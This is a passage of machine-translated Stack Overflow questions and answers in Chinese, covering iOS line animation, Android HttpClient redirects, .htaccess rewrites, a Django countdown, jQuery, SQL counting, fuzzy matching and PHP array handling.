       animation.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
      [animation setAutoreverses:NO];
      [animation setFromValue:(id)path];
      [animation setToValue:(id)path];
      [lineLayer addAnimation:animation forKey:@"animatePath"];    
} 
```

`startTotalLine`在调用方法之前绘制的线。此外，该`startTotalLine`方法不会影响线路。

我希望它从右到左为线条图设置动画。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T18:54:59.890

我会用动画属性来做。

为了实现这一点，我将创建一个自定义`CALayer`类 - 我们称之为`LineLayer`。定义一个`startPoint`属性，一个`length`属性。然后我将`length`属性配置为“动画”。

代码如下所示：

```
// LineLayer.h
@interface LineLayer: CALayer

@property (nonatomic, assign) int length;
// This was omitted from the SO code snippet.
@property (nonatomic, assign) CGPoint startPoint;

@end

// LineLayer.m
@implementation LineLayer

@synthesize length = _length;
// This was omitted from the SO code snippet.
@synthesize startPoint= _startPoint;

- (id) initWithLayer:(id)layer 
{
    if(self = [super initWithLayer:layer]) 
    {
        if([layer isKindOfClass:[LineLayer class]]) 
        {
            // This bit is required for when we CA is interpolating the values.
            LineLayer *other = (LineLayer*)layer;
            self.length = other.length;
            self.startPoint = other.startPoint; // This was omitted.
        }
    }
    return self;
}

+ (BOOL)needsDisplayForKey:(NSString *)key 
{
    if ([key isEqualToString:@"length"]) {
        return YES;
    }
    return [super needsDisplayForKey:key];
}

- (void) setLength:(int)newLength
{
    if (newLength < 0) {
        return; // Fail early.
    }
    _length = newLength; 
    [self setNeedsDisplay]; 
} 

/*
    This should have been drawInContext:(CGContextRef)context
    - (void) drawRect:(CGRect) rect 
*/
- (void) drawInContext:(CGContextRef)context
{
    //...Do your regular drawing here.

    // This was omitted from the SO code snippet.
    CGContextSetStrokeColorWithColor(context, [UIColor redColor].CGColor);
    CGContextSetLineWidth(context, 2);
    CGContextMoveToPoint(context, _startPoint.x, _startPoint.y);
    CGContextAddLineToPoint(context, _startPoint.x + _length, _startPoint.y);
    CGContextStrokePath(context);
}

@end 
```

然后在您的视图控制器中，您可以`LineLayer`像这样使用：

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    LineLayer *lineLayer = [LineLayer new];

    // This was omitted from the SO code snippet.
    lineLayer.frame = CGRectMake(0, 0, 320, 480);
    [lineLayer setNeedsDisplay];
    // ---

    lineLayer.startPoint = CGPointMake(0, 100);
    lineLayer.length = 0;

    [self.view.layer addSublayer:lineLayer];

    // Now animate the changes to the length property
    CABasicAnimation *anim = [CABasicAnimation animationWithKeyPath:@"length"];
    anim.duration = 5; // Change should table about 5 mins.
    anim.fromValue = [NSNumber numberWithInt:0];
    anim.toValue = [NSNumber numberWithInt:200];

    [lineLayer addAnimation:anim forKey:@"animateLength"];
    lineLayer.length = 200;
    //Do clean up below...
} 
```

快乐编码:)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T15:19:48.153

我认为做你想做的最简单的方法是呈现一些 1.5 像素高度的 UIView 并为其宽度设置动画。问我是否不清楚。

我认为您的代码不起作用，因为您的变量`path`不是图层属性。阅读[手册](http://developer.apple.com/library/ios/#documentation/GraphicsImaging/Reference/CABasicAnimation_class/Introduction/Introduction.html#//apple_ref/occ/cl/CABasicAnimation)：

> CABasicAnimation 为图层属性提供基本的单关键帧动画功能。

你在这里做了一些奇怪的事情：

```
[animation setFromValue:(id)path];
[animation setToValue:(id)path]; 
```

编辑：我偶然发现了[一篇文章](http://tumbljack.com/post/179975074/complex-interpolation-with-cashapelayer-free)，并了解您要达到的目标！现在我认为你失败的原因是你可以为不改变点数的路径设置动画。现在我想你可以用两点创建一条路径线。起初它们在同一个地方，另一条路径是你想要结束的那条线。现在从第一条路径动画到第二条。我认为它应该工作，但我不确定。

编辑：绝对！你需要这个人的代码。[吉特链接](http://github.com/joericioppo/Shape_04/tree/master)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-04T01:43:34.417

这是我使用“UIBezierPath”、“CAShapeLayer”和属性“strokeEnd”针对您的情况的解决方案：

.m 文件

```
@synthesize shapeLayer;
[self drawLine];

-(void)drawLine {
    CGFloat X1 = self.frame.size.width/2-100;
    CGFloat Y1 = 260;
    CGFloat X2 = self.frame.size.width/2+100.0;
    CGFloat Y2 = 260;

    UIBezierPath *path = [UIBezierPath bezierPath];
    [path moveToPoint:CGPointMake(X1, Y1)];
    [path addLineToPoint:CGPointMake(X2, Y2)];

    CAShapeLayer *shapeLayer = [CAShapeLayer layer];
    shapeLayer.path = [path CGPath];
    shapeLayer.strokeColor = [[UIColor blueColor] CGColor];
    shapeLayer.lineWidth = 1.5;
    shapeLayer.fillColor = [[UIColor redColor] CGColor];
    shapeLayer.strokeEnd =0;

    [self.layer addSublayer:shapeLayer];
    [self performSelector:@selector(startTotalLine) withObject:nil afterDelay:1.5];
}

- (void)startTotalLine {   
    CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:@"strokeEnd"];
    animation.duration = 3.5f;
    animation.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
    [animation setAutoreverses:NO];
    [animation setFromValue:[NSNumber numberWithInt:0]];
    [animation setToValue:[NSNumber numberWithInt:1]];
    [shapeLayer addAnimation:animation forKey:@"animatePath"];
} 
```

默认的“strokeEnd”值为1，因此，在开头设为0（不会出现线条）。顺便说一句，这里提供了有用的例子：http: [//jamesonquave.com/blog/fun-with-cashapelayer/](http://jamesonquave.com/blog/fun-with-cashapelayer/)

# java - android HttpResponse 总是在第二次被调用时死掉

> ID：10603395
> 
> 赞同：6
> 
> 时间：2012-05-15T14:54:03.890
> 
> 标签：java, android, apache, drupal, httpresponse

我有一个奇怪的故障，我不能两次拨打同一个网络电话。

```
 HttpClient client = new DefaultHttpClient();
    HttpPost post = new HttpPost(url);

    try {
         HttpResponse response = client.execute(post, new BasicHttpContext()); 
```

我第一次运行网络调用它工作得很好，数据被返回。我第二次运行网络调用（我在这里运行断点）它到达 HttpResponse 对象，运行网络调用，但随后立即跳转到`IOException`catch。

`post`对象每次都有相同的数据，cookies都包括在内。

我周围没有任何了解服务器（运行drupal）的人，但这似乎是服务器问题。

有人可以解释为什么会发生这种情况吗？为什么我会被禁止第二次取回数据？

为了进一步说明问题，如果我突破响应对象，我可以看到它可能会返回`""`而不是数据。如果这有帮助的话

```
05-15 11:22:34.612: E/(1094): ObjectService
05-15 11:22:34.612: E/(1094): org.apache.http.client.ClientProtocolException
05-15 11:22:34.612: E/(1094):   at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:557)
05-15 11:22:34.612: E/(1094):   at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
05-15 11:22:34.612: E/(1094):   at com.fivepoints.service.ObjectService.getObject(ObjectService.java:121)
 05-15 11:22:34.612: E/(1094):  at com.fivepoints.model.team.TeamView$ActivityListTask.doInBackground(TeamView.java:94)
 05-15 11:22:34.612: E/(1094):  at com.fivepoints.model.team.TeamView$ActivityListTask.doInBackground(TeamView.java:1)
05-15 11:22:34.612: E/(1094):   at android.os.AsyncTask$2.call(AsyncTask.java:185)
05-15 11:22:34.612: E/(1094):   at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:306)
05-15 11:22:34.612: E/(1094):   at java.util.concurrent.FutureTask.run(FutureTask.java:138)
05-15 11:22:34.612: E/(1094):   at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1088)
05-15 11:22:34.612: E/(1094):   at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:581)
05-15 11:22:34.612: E/(1094):   at java.lang.Thread.run(Thread.java:1019)
05-15 11:22:34.612: E/(1094): Caused by: org.apache.http.client.CircularRedirectException: Circular redirect to 'http://mysite.com/demoObject/_c'
05-15 11:22:34.612: E/(1094):   at org.apache.http.impl.client.DefaultRedirectHandler.getLocationURI(DefaultRedirectHandler.java:173)
05-15 11:22:34.612: E/(1094):   at org.apache.http.impl.client.DefaultRequestDirector.handleResponse(DefaultRequestDirector.java:903)
05-15 11:22:34.612: E/(1094):   at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:468)
05-15 11:22:34.612: E/(1094):   at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
05-15 11:22:34.612: E/(1094):   ... 10 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:41:40.467

起初我记录错误的方式也导致了崩溃，所以我不知道确切的错误是什么。

真正的例外是`Caused by: org.apache.http.client.CircularRedirectException`因为服务器处理 API 调用的方式

这是来自的答案：

[https://stackoverflow.com/a/6699772/727429](https://stackoverflow.com/a/6699772/727429)

`HttpClient client = new DefaultHttpClient(); client.getParams().setParameter(ClientPNames.ALLOW_CIRCULAR_REDIRECTS, true);`

# .htaccess - .htaccess 重定向动态搜索页面

> ID：10603396
> 
> 赞同：1
> 
> 时间：2012-05-15T14:54:07.077
> 
> 标签：.htaccess, search, redirect, dynamic

我需要有关动态搜索页面的帮助。我需要改变：

```
/download.php?q=search 
```

到

```
/download.php?mp3=search 
```

所以只有搜索页面需要把q改成mp3。如果有人可以提供帮助，我将不胜感激。我想通过 .htaccess 做到这一点

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:57:03.580

类似的东西：

```
RewriteRule    ^/download.php?q=(.*)    /download.php?mp3=$1 [L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T16:45:06.253

查询字符串只能作为 RewriteCond 的变量使用。像这样的东西应该工作：

```
RewriteCond %{QUERY_STRING} q=([^&]*)
RewriteRule ^download.php download.php?mp3=%1 [L,QSA,NC] 
```

# ajax - 如何在 django 中实现倒数计时器

> ID：10603409
> 
> 赞同：3
> 
> 时间：2012-05-15T14:55:05.627
> 
> 标签：ajax, django, countdown

我只需要一个大致的想法。我正在用 django 开发一个运动应用程序。此应用程序需要测量时间并将其显示给用户。在倒计时期间，我还需要执行一些可能发生的“动作”。这意味着根据一种操作调用另一个视图，标记此操作并使用计时器重定向回原始视图，用户现在可以在其中看到更改。我想我无法在服务器端（django）上实现倒计时。我必须使用 JavaScript 来执行此操作，但是……每次用户执行操作时，倒计时都会停止。我必须为此使用 AJAX 吗？有没有更好的方法来实现这一点。谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2019-11-29T11:31:05.333

模型.py

```
class chek(models.Model):
    date = models.DateTimeField(auto_now_add=False, blank=True, null=True) 
```

视图.py

```
def jaya(request):
  ob=chek.objects.get(id=2)
  return render(request,'jaya.html',{'ob':ob}) 
```

使用这样的脚本

```
<script>
function makeTimer() {
   var endTime=new Date({{ ob.date|date:"U" }} * 1000);
    endTime = (Date.parse(endTime) / 1000);

        var now = new Date();
        now = (Date.parse(now) / 1000);

        var timeLeft = endTime - now;

        var days = Math.floor(timeLeft / 86400);
        var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
        var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600 )) / 60);
        var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));

        if (hours < "10") { hours = "0" + hours; }
        if (minutes < "10") { minutes = "0" + minutes; }
        if (seconds < "10") { seconds = "0" + seconds; }

        $("#days").html(days + "<span>Days</span>");
        $("#hours").html(hours + "<span>Hours</span>");
        $("#minutes").html(minutes + "<span>Minutes</span>");
        $("#seconds").html(seconds + "<span>Seconds</span>");

}

setInterval(function() { makeTimer(); }, 1000);
</script> 
```

html正文

```
<body class="game_info" data-spy="scroll" data-target=".header">

     <div class="col-md-6 col-sm-6 col-xs-12">
        <div class="row">
           <div class="full">
              <div class="right-match-time">
                 <h2>Next Match</h2>
                 <ul id="countdown-1" class="countdown">
                    <li><span id="days"></span>Day </li>
                    <li><span id="hours"></span>Hours </li>
                    <li><span id="minutes"></span>Minutes </li>
                    <li><span id="seconds"></span>Seconds </li>
                 </ul>

              </div>
           </div>
        </div>
     </div>
  </div> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:14:26.303

你肯定需要一些 javascript 来做倒数计时器。像这个 - [http://keith-wood.name/countdown.html](http://keith-wood.name/countdown.html)

然后发生任何操作，您可以对您的 django URL(view) 进行基本的 ajax 调用，以更新数据库中的任何值或您需要对请求执行的任何其他操作。

当倒计时停止时，您可能可以将一些剩余时间值记录到 django 中，然后当您需要继续计时器时，您可以再次对某个视图进行 ajax 调用，这将返回您开始倒计时的时间，您可以重建您的倒数计时器与剩余时间。

# java - JavaFX 可以调用和嵌入 OCX 组件吗

> ID：10603412
> 
> 赞同：2
> 
> 时间：2012-05-15T14:55:13.250
> 
> 标签：java, activex, javafx, ocx

JavaFX 是否能够加载和嵌入 OCX 控件？我想在我的应用程序中使用 Internet Explorer，因为 WebKit 浏览器不支持 ActiveX。而且由于我必须依赖第三方 ActiveX 控件（我知道它们是邪恶的），所以我必须使用 IE。

这个问题与“我可以在 Java 中使用 OCX”不完全相关，因为我想拥有某种我想使用的 JavaFX 组件。

还是我必须依赖此处发布的库：

[在 Java 中使用 .OCX 控件](https://stackoverflow.com/questions/3427151/use-a-ocx-control-in-java)

提前致谢，

斯文

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T17:22:21.337

您必须依赖您在问题中提供的链接中发布的库。或者您需要编写自己的 JNI 接口。

如果您确实访问 OCX 组件，您可能需要将它们放置在它们自己的窗口中，而不是共享由 JavaFX 阶段创建的窗口，因为您可能会遇到 JavaFX 渲染器冲突写入显示 OCX 组件的窗口部分的问题- 你必须尝试一下，看看会发生什么来确认。

更简单的方法可能是请求您的应用程序的用户将他们的默认浏览器设置为 IE，然后调用 JavaFX [hostservices.showDocument(uri)](http://docs.oracle.com/javafx/2/api/javafx/application/HostServices.html#showDocument%28java.lang.String%29) api 来启动一个嵌入了您需要的 OCX 组件的 IE 页面。

另一种选择是：

1.  将您的 JavaFX 应用程序作为小程序嵌入网页中。
2.  还可以在网页中嵌入您的 activex 控件。
3.  在显示网页时，检查浏览器，如果不是 IE，请告诉他们用户必须使用 Internet Explorer。
4.  让用户接受浏览器显示的任何其他安全警告。
5.  让用户（或者可能是 JavaScript）将浏览器窗口的大小调整为全屏（请参阅[IE9 全屏模式](http://browsers.about.com/od/internetexplorertutorials/ss/IE9-full-screen-mode_3.htm)或[使用 JavaScript 的全屏浏览器](https://stackoverflow.com/questions/1125084/how-to-make-in-javascript-full-screen-windows-stretching-all-over-the-screen)）。
6.  使用通过[javafx/javascript 桥](http://docs.oracle.com/javafx/2/deployment/javafx_javascript.htm)调用调用的 javascript 在您的活动 X 控件和 java 应用程序之间进行通信，并通过页面中嵌入的 VBScript 控制您的活动 X 控件。

它可能会起作用，但它是一个丑陋的科学怪人解决方案。. .

如果您可以将您的媒体转换为 JavaFX 支持的格式并直接通过 JavaFX 播放，那将是更可取的，或者由于深度 ActiveX 集成要求，JavaFX 不是您的最佳解决方案。问题，您可以使用 Silverlight 之类的东西过得更好。

# google-app-engine - 无论如何让我的 Jasmine 测试在本地 gae 服务器上运行

> ID：10603415
> 
> 赞同：0
> 
> 时间：2012-05-15T14:55:27.757
> 
> 标签：google-app-engine, maven-3, jasmine-maven-plugin

我正在尝试使用 Jasmine 针对我们的后端 API 测试我的骨干前端。

我们的应用是基于google app engine构建的，我们的构建系统使用maven，所以我使用了jasmine-maven-plugin来方便测试前端与API的集成。

但是，当我尝试运行测试时，没有任何 REST API 调用可用（这是有道理的，因为服务器 jasmine 启动仅用于 jasmine 测试）。

有谁知道让 Jasmine 插件使用“gae：run”目标启动的码头服务器的方法？

因为有大量经过身份验证的调用，所以进行前端测试的服务器和 API 需要相同，包括端口（或者都是跨域请求）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:03:40.967

在这里查看服务器的 Jasmine 源代码：[https](https://github.com/searls/jasmine-maven-plugin/blob/master/src/main/java/com/github/searls/jasmine/ServerMojo.java) ://github.com/searls/jasmine-maven-plugin/blob/master/src/main/java/com/github/searls/jasmine/ServerMojo.java它看起来像 jasmine 一样直接使用码头服务器。我不相信 appengine 可以让您直接访问其自定义码头驱动程序，但您可能想查看 gae-maven-plugin 源代码以了解他们是如何做到的。您需要为 jasmine 编写自己的 ServerMojo 实现并将其插入其中。

# jquery - jQuery 错误地检测到了父母

> ID：10603421
> 
> 赞同：0
> 
> 时间：2012-05-15T14:55:46.760
> 
> 标签：jquery

我有如下的html结构：

```
<div id="banner-menu-holder">
    <div>
        <div class="avalible">
            <div class="items-holder">
                <div>
                    <div class="img-holder">
                        <div>
                            <input id="set_banner_29" type="checkbox" onclick="mod.setBanner(29);">
                            ...
                        </div>
                    </div>
                </div>
                ...
            </div>
        </div>
        <div class="ready">
            <div class="items-holder">
                <div>
                    <div class="img-holder">
                        <div>
                            <input id="rem_banner_1_8_32" class="remove_banner" type="checkbox" checked="checked">
                            ...
                        </div>
                    </div>
                </div>
                ...
            </div>
        </div>
    </div>
</div> 
```

和js代码：

```
$(document).click(function(ev) {
    if ($(ev.target).parents().index($('#banner-menu-holder')) == -1) {
        $('#banner-menu-holder').css('display', 'none');
    }        
}) 
```

当我单击复选框进入第一个 div（可用类）时，函数已成功执行 - 此复选框是主 div 的子项（#banner-menu-holder）。

当我单击第二个 div 的复选框并且该功能不起作用时。jQuery 没有检测到这些复选框是主 div 的子级。

这个问题是 jQuery 还是其他？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:58:13.497

尝试使用[`closest()`](http://api.jquery.com/closest/)来检查当前元素是否有带有`banner-menu-holder`id 的父元素：

```
if (!$(ev.target).closest('#banner-menu-holder').length) {
    $('#banner-menu-holder').css('display', 'none');
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:08:55.353

好像你正在做事件委托，但是以一种非常笨重的方式。

jQuery 使用`.on()`.

```
$(document).on('click', '#banner-menu-holder', function(ev) {
    $('#banner-menu-holder').css('display', 'none');
});
$(document).on('click', ':not(#banner-menu-holder)', function(ev) {
    $('#banner-menu-holder').css('display', 'none');
}); 
```

* * *

如果您使用的是 jQuery 1.4-1.6.x，则可以`.delegate()`改用。

```
$(document).delegate('#banner-menu-holder', 'click', function(ev) {
    $('#banner-menu-holder').css('display', 'none');
});

$(document).delegate(':not(#banner-menu-holder)', 'click', function(ev) {
    // do something else
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T14:59:05.470

我不确定您要做什么，但是如果您想查看单击的元素是否在`#banner-menu-holder`元素内，我会这样写：

```
if($(ev.target).closest('#banner-menu-holder').length > 0) {
    ...
} 
```

# c++ - 用于压缩的好免费库

> ID：10603423
> 
> 赞同：-1
> 
> 时间：2012-05-15T14:55:52.157
> 
> 标签：c++, compression

我需要压缩库来满足以下需求：

1) 将目录打包在一个文件中，扩展名是我选择的（例如 .pack ）

2) 使用此文件（目录）中的内容而不解压缩它

3) 加密机制

我已经知道 zlib，但对我来说，它的文档很丑陋，并且没有写在任何地方，它支持哪些功能

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:33:37.930

> 使用我选择的扩展名将目录打包在一个文件中（例如 .pack ）

大多数存档程序不要求您使用特定的文件扩展名。无论如何，仍然可以调用`file`文件来猜测其内容类型。

> 使用此文件（目录）中的内容而不解压缩它

可以手动创建一个文件列表并将其添加到任何存档文件之前。通常，`.sh`Linux 的安装程序在开头包含一个 shell 脚本，然后是一些神奇的行，例如`__ARCHIVE_START__`二进制存档。因此，可以从文件中读取行，直到`__ARCHIVE_START__`行被读取。该文件的其余部分是一个存档文件。

> 加密机制

一种简单的方法是使用不同的库进行归档和加密：

1.  将文件捆绑为一个`.tar`.
2.  存档`.tar`成说`.tar.xz`。
3.  `.tar.xz`在文件列表前面加上`__ARCHIVE_START__`行。
4.  使用您喜欢的任何加密库加密文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:48:34.817

你想要的不是压缩库。您需要一个或多个压缩、归档和加密库。您需要归档以将文件目录放入单个文件中。

您可以使用 zlib 进行压缩部分，但不能存档或加密。 [zlib](http://zlib.net/)记录在[zlib.h](http://zlib.net/manual.html)中，您可以在那里看到一个[使用示例](http://zlib.net/zlib_how.html)，以及[源代码分发包](http://zlib.net/zlib-1.2.7.tar.gz)中的许多示例。

您可以构建自己的存档格式，也可以使用现有的存档格式，其中包含[zip](http://www.nih.at/libzip/)或[tar](http://www.feep.net/libtar/)等库，这两种格式都使用或可以指导使用 zlib。

您可以使用[OpenSSL](http://www.openssl.org/)进行强加密。

# datagrid - 更改 DataGrid 控件上未使用区域（不是单元格背景）的背景颜色

> ID：10603439
> 
> 赞同：2
> 
> 时间：2012-05-15T14:56:51.843
> 
> 标签：datagrid, vb6

该`BackColor`属性仅适用于单元格区域的背景 - 周围未使用的区域（如果单元格未填充控件）似乎默认为按钮面。

有没有办法直接设置？或者使未使用的区域对其下方的表单/容器透明？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T00:02:01.980

改用 BackColorBkg 属性

# linux - 在多个 /dev 文件之间共享一个 linux 驱动程序

> ID：10603440
> 
> 赞同：1
> 
> 时间：2012-05-15T14:56:54.080
> 
> 标签：linux, io, driver, port, tty

**目标**：采用现有驱动程序控制代表多个 com 端口的 FPGA，并将每个单独的端口分离到自己的设备文件中。

**我需要什么**：如果有人有更全面的资源，我可以阅读以了解更多信息，或者有经验并可以提供建议。

**到目前为止我所做的**：我已经寻找资源并找到[了这个，](http://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN40)对于那些编写内核模块经验有限的人来说，这似乎是一个非常全面的文档。

**为什么我需要这样做**：我目前已经编写了使用我的主驱动程序来控制所有端口的软件。我现在需要允许多个任意程序使用某些端口，而无需对我的软件一无所知。

我现在拥有的是 FPGA 的单个驱动程序，我已将其编程为具有 16 个全双工 RS-422 端口，这些端口通过我的单个驱动程序进行控制。我需要了解的是，是否有可能/如何创建多个 /dev/faketty 端口，每个端口都可以调用我的“主”驱动程序并控制单个端口，同时对于任何打开它们的程序来说看起来就像一个普通的 TTY 端口。

感谢您的任何建议。

# ruby-on-rails - 将 Model.where(...) 集合传递给 delay_job 时参数数量错误（2 比 1）

> ID：10603446
> 
> 赞同：0
> 
> 时间：2012-05-15T14:57:10.243
> 
> 标签：ruby-on-rails, ruby-on-rails-3, delayed-job

我正在尝试每小时为模型运行一次计划更新，但前提是它是 24 小时前的最后一次更新。如果我只有`@rentals = Rental.all`.where(..) 我会得到一个`wrong number of arguments (2 for 1)`：

```
def delayed_stat_updates
  @rentals = Rental.where("updated_at < ?", 24.hours.ago)
  StatsController.delay(queue: 'stats').stat_updates(@rentals)
  StatsController.delay(queue: 'stats').index_check(@rentals)
  StatsController.delay(queue: 'stats').update_stats_error_attribute(@rentals)
  StatsController.delay(queue: 'stats').error_notification_email
end 
```

我该如何解决这个问题？另外，这是运行这些更新的好方法吗？以前我在每个方法中都抓取了对象，但是如果其中一个更新花费的时间太长，它可能会意外地开始抓取额外的对象以进行下一次更新。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T16:16:04.480

`Rental.where("updated_at < ?", 24.hours.ago)`是完全有效的，我认为问题可能是由 Arel(.where) 和 Array(.all) 对象之间的差异引起的。你试一试 `Rental.where("updated_at < ?", 24.hours.ago).all`

# asp.net - 多列条件计数 SQL

> ID：10603448
> 
> 赞同：3
> 
> 时间：2012-05-15T14:57:15.900
> 
> 标签：asp.net, sql, ms-access

我正在尝试连续计算 4 个单独列中的不同条目，然后汇总结果。

例如，表头看起来类似于：

```
ID       Col1    Col2    Col3    Col4 
```

每列（保存 ID）可以有一个文本值 W、X、Y 或 Z。列可以有相同的值。

我想做的是找出一种方法来计算列中的每个条目，但每行只计算 W、X、Y 和 Z 一次。因此，如果：

```
ID       Col1    Col2    Col3    Col4
          X        X       Y
          Y        W       X
          Z        Y       Y 
```

结果表将是：

```
 Value    Count
      W        1
      X        2
      Y        3
      Z        1 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:59:33.763

对于您的示例 4 案例，这样的事情应该这样做：

```
select 'W' as [Value], count(*) as Count from Table1
    where Col1='W' or Col2='W' or Col3='W' or Col4='W' union
select 'X' as [Value], count(*) as Count from Table1
    where Col1='X' or Col2='X' or Col3='X' or Col4='X' union
select 'Y' as [Value], count(*) as Count from Table1
    where Col1='Y' or Col2='Y' or Col3='Y' or Col4='Y' union
select 'Z' as [Value], count(*) as Count from Table1
    where Col1='Z' or Col2='Z' or Col3='Z' or Col4='Z' 
```

演示：[http ://www.sqlfiddle.com/#!3/68aa3/11](http://www.sqlfiddle.com/#!3/68aa3/11)

* * *

**编辑：** 如果有很多可能的值，可以通过合并所有可能的值并动态计算它们来进一步简化：

```
select V.Value as [Value],
  count(IIF(col1=[Value] or col2=[Value]
            or col3=[Value] or col4=[Value],1,NULL)) as [Count]
from Table1, (
  select distinct col1 as [Value] from table1 union
  select distinct col2 from table1 union
  select distinct col3 from table1 union
  select distinct col4 from table1) V
where V.value is not null
group by V.value 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:17:47.933

也许我错过了一些东西，但这会很简单：

```
Select Val, Count(*)
From    (
        Select Id, Col1 As Val From Table1
        Union Select Id, Col2 From Table1
        Union Select Id, Col3 From Table1
        Union Select Id, Col4 From Table1
        ) As Z
Where Z.Val Is Not Null
Group BY Z.Val 
```

没有理由将`Distinct`and`Union`一起使用`Union`会使结果不同。因此，我们需要包含每一行的唯一值 ( `Id`)。

[SQL Fiddle](http://www.sqlfiddle.com/#!3/68aa3/14)（这使用 SQL Server，但在 MS Access 中也可以使用相同的语法）

# c# - 模糊匹配、置信度、C#

> ID：10603449
> 
> 赞同：1
> 
> 时间：2012-05-15T14:57:17.667
> 
> 标签：c#, similarity, fuzzy

我正在尝试计算字符串出现在更大集合的子集中的置信度分数。

假设我的原始列表中有 10 个单词，我将一个新单词与所有 10 个单词匹配。每个匹配返回一个相似度分数。我设置了一个阈值来忽略任何低于 70% 的相似度分数。所以最后我留下了我的输入单词，可能匹配我列表中的 3 个单词。

对我来说，这给了我 33.333% 的机会，我的输入词与相似度得分较高的 3 个词匹配。我想计算一下我对这三个词匹配的信心。我计算了我的信心分数如下，但这似乎是错误的，而且很简单。

1.  猫 1 - 70% 的相似性 - 33.3% 的机会。
2.  猫 2 - 75% 的相似性 - 33.3% 的机会。
3.  Cat 3 - 80% 的相似性 - 33.3% 的机会。

((0.70) * (0.333)) + ((0.75) * (0.333)) + ((0.80) * (0.333)) = 75% 有信心。

计算置信度的最佳方法是什么？

编辑：根据要求提供更好的样品

原字集

1.  你好
2.  帮助
3.  地狱
4.  问题
5.  世界
6.  海洋
7.  动物
8.  胡萝卜
9.  棕色的
10.  黑色的

匹配新词 - 直升机与原始词集。匹配从原始集合中返回 3 个单词，相似度得分超过 70%。返回的词是： 1\. 你好 - 相似度 70% 2\. 帮助 - 相似度 75% 3\. 地狱 - 相似度 80%

我想计算分数，以显示我对 helpicopter 与返回的单词匹配的信心。

答案：在 [链接] [http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/ff9fc38e-8ca3-4d9a-b505-dfbe37910b17](http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/ff9fc38e-8ca3-4d9a-b505-dfbe37910b17)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:03:33.693

您的概率不正确（或不是概率）。您似乎已经假设您的词**与**前三个相似度得分之一匹配（如果是，那么您的置信度*实际上*是100%...）。此外，概率和相似性分数不是独立的，因此如果您正在寻找任何具有概率/统计基础的东西，那么您的计算也是有缺陷的。

您实际上所做的是计算出前三个案例的**平均**“相似性”。如果这可以作为您的（非统计）置信水平，那很好。但是您将不得不自己对此进行价值调用-您正在尝试做的事情没有真正的数学基础。为了进一步提供帮助，您必须向我们提供更多关于以下方面的信息：

*   如何计算您的相似度分数。
*   您的单词与开头 10 个单词匹配的概率是多少。
*   您列表中的 10 个单词有多相似。
*   等等等等

* * *

**在您的编辑之后进行编辑：**

您的三个“相似度”分数远非独立，因为这三个词本身非常“相似”。无论如何，任何说“直升机”与“地狱”有 80% 相似度的算法都不是很好。我想说在这种情况下，置信水平非常接近于零......！

# php - 多维数组需要作为

> ID：10603451
> 
> 赞同：0
> 
> 时间：2012-05-15T14:57:19.737
> 
> 标签：php, arrays

下面的实际数组基本上是 $_POST 的数组。人们可以理解来自表格的内容。三个具有相同名称不同值的控件。我需要的是在这个数组下面。

```
Array
(
    [mytext] => Array
        (
            [0] => aaaa
            [1] => bbbb
            [2] => ddd
        )

    [mysel] => Array
        (
            [0] => one
            [1] => two
            [2] => two
        )

    [submit] => Submit
) 
```

我需要下面的行格式的数组，但是是基于 $_POST 数据的动态数组。

```
Array
(
    [0] => Array
        (
            [0] => aaaa
            [1] => one

        )

    [1] => Array
        (
            [0] => bbbb
            [1] => two

        )

    [2] => Array
        (
            [0] => dddd
            [1] => two

        )

) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T05:33:19.840

```
// Code To Get controls value in row wise
$count=0;
foreach($_POST as  $key=>$val){
    foreach($_POST[$key] as $val2){
        $row[$count][]=$val2;
        $count++;
    }
    $count=0;
}
print_r($row); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:02:24.763

尝试这个：

```
$out = Array();
foreach($_POST['mytext'] as $k=>$v) {
    $out[$k] = Array($v,$_POST['mysel'][$k]);
}
var_dump($out); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:03:26.827

